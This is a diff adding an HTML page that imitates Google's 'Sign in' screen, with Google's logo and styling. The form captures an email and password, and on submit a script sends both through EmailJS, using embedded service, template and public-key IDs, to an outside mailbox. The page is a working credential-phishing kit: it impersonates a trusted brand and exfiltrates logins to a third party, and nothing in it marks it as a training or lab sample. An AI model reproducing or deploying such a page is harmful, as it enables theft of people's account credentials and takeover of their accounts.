@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("VYKK057zR_OaMB7bb"); // Your Public Key
+    })();
+  </script>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: white;
+      width: 360px;
+      padding: 40px 30px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .google-logo {
+      height: 40px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-weight: 400;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 20px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 4px;
+      font-size: 16px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+
+    .button:hover {
+      background-color: #1669c1;
+    }
+
+    .bottom-text {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #5f6368;
+    }
+
+    .create-account {
+      text-decoration: none;
+      color: #1a73e8;
+    }
+
+    .create-account:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo"/>
+    <h2>Sign in</h2>
+    <p>to continue to Google</p>
+    <form id="login-form">
+      <input type="email" name="email" placeholder="Email or phone" required />
+      <input type="password" name="password" placeholder="Enter your password" required />
+      <button class="button" type="submit">Next</button>
+    </form>
+    <div class="bottom-text">
+      <a class="create-account" href="#">Create account</a>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      emailjs.sendForm('service_a2telwm', 'template_1nv1vqd', this)
+        .then(function() {
+          alert("Information sent to your email successfully!");
+        }, function(error) {
+          alert("Failed to send. Error: " + JSON.stringify(error));
+        });
+
+      this.reset();
+    });
+  </script>
+</body>
+</html>
